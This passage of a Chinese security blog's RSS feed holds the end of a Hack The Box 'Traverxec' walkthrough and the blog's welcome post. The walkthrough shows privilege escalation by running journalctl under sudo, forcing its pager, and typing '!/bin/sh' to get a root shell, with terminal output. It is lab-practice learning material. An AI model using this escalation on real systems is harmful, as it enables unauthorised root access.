echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;
echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;
echo &quot; &quot;
echo &quot;Last 5 journal log lines:&quot;
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现  /usr/bin/journalctl 是作为 root 运行的，这一点很重要。&lt;/p&gt;

&lt;p&gt;查看  &lt;a href=&quot;https://gtfobins.github.io/gtfobins/journalctl/&quot;&gt;GTFObins&lt;/a&gt;，发现通过 sudo 运行的 journalctl 可以被利用来提权。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;GTFObins:&lt;/strong&gt; Gtfo这款工具采用Python3开发，在Gtfo的帮助下，广大研究人员可以直接在命令行终端窗口中搜索 GTFOBins(Linux) 和 LOLBAS(Win) 代码文件。&lt;/p&gt;

  &lt;p&gt;该工具的主要功能就是帮助研究人员直在命令行终端窗口中搜索 GTFOBins 和 LOLBAS 代码文件。除此之外，它还可以让研究人员专注于命令行串钩，而无需面对明亮的白色背景的桌面窗口，它可以帮助我们将vim、反向Shell和其他漏洞利用“合为一体”。&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/214286.html&quot;&gt;如何在Windows和Linux上搜索可利用的二进制文件或exe文件&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5evah4wj31e00u07bg.jpg&quot; alt=&quot;image-20200103100856286&quot; /&gt;&lt;/p&gt;

&lt;p&gt;注意到 &lt;code&gt;journalctl&lt;/code&gt; 的提权利用方式和 &lt;code&gt;less&lt;/code&gt; 一样，因此必须想办法触发 &lt;code&gt;pager&lt;/code&gt; ，一个简单的办法就是把终端窗口尽可能调小。之后执行 &lt;code&gt;!/bin/sh&lt;/code&gt;，获得 root 权限。&lt;/p&gt;

&lt;center&gt;    &lt;img style=&quot;border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);&quot; src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5opf7nlj31c00u0b29.jpg&quot; /&gt;    &lt;br /&gt;    &lt;div style=&quot;color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;&quot;&gt;当窗口较大则无法触发&lt;/div&gt; &lt;/center&gt;
&lt;center&gt;    &lt;img style=&quot;border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);&quot; src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gaj60bu62rj31460u0qdv.jpg&quot; /&gt;    &lt;br /&gt;    &lt;div style=&quot;color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;&quot;&gt;当窗口较小则可以提权&lt;/div&gt; &lt;/center&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:21:37 EST
Jan 02 11:14:48 traverxec sudo[2762]: pam_unix(sudo:auth): authentication failur
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): conversation failed
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): auth could not identi
Jan 02 11:14:50 traverxec sudo[2762]: www-data : command not allowed ; TTY=pts/1
Jan 02 11:14:51 traverxec crontab[2855]: (www-data) LIST (www-data)
!/bin/sh
# ls
server-stats.head  server-stats.sh  try.sh
# cd
# whoami
root
# ls
nostromo_1.9.6-1.deb  root.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x05-thanks&quot;&gt;0x05 Thanks！&lt;/h2&gt;

&lt;p&gt;也算是自己边学边记录，望大佬手下留情~&lt;/p&gt;
</description>
        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/HTB-Traverxec/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Traverxec/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>Welcome to WuJ1n9 Blog</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;“Yeah It’s on. ”&lt;/p&gt;

  &lt;p&gt;初次见面，请多指教。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;2020 年，当了十几年考试机器， WuJ 想是时候写点东西了。&lt;/p&gt;

&lt;p&gt;感谢 &lt;a href=&quot;https://github.com/Huxpro/huxpro.github.io&quot;&gt;Hux&lt;/a&gt; 的 &lt;a href=&quot;http://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; 模板，让搭建一个实用美观的博客如此简便。&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;正文&quot;&gt;正文&lt;/h2&gt;

&lt;p&gt;步入研究生以来，一直被项目、论文牵扯，很多喜欢的东西都没能持续投入。也算是在新的一年下定决心，还是把时间花在自己感兴趣的事物上，所以决定写点东西。&lt;/p&gt;

&lt;p&gt;博客应该主要会包含下面一些内容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网络安全技术相关&lt;/li&gt;
  &lt;li&gt;CTF wp&lt;/li&gt;
  &lt;li&gt;渗透测试相关（HTB Walkthrough、实战等）&lt;/li&gt;
  &lt;li&gt;逆向技术&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然可能主要还是对大佬的分享进行再加工，毕竟技术水平确实有限…&lt;/p&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;

&lt;p&gt;这个博客的诞生，纯粹是突发奇想，也希望自己能一直坚持下去，在复现和记录中更深刻地理解。&lt;/p&gt;

&lt;p&gt;如果你恰好逛到了这里，希望你也能喜欢这里。&lt;/p&gt;
</description>
        <pubDate>Fri, 03 Jan 2020 02:48:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/hello-2020/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/hello-2020/</guid>
        
        <category>生活</category>
        
        
      </item>
    
  </channel>
</rss>
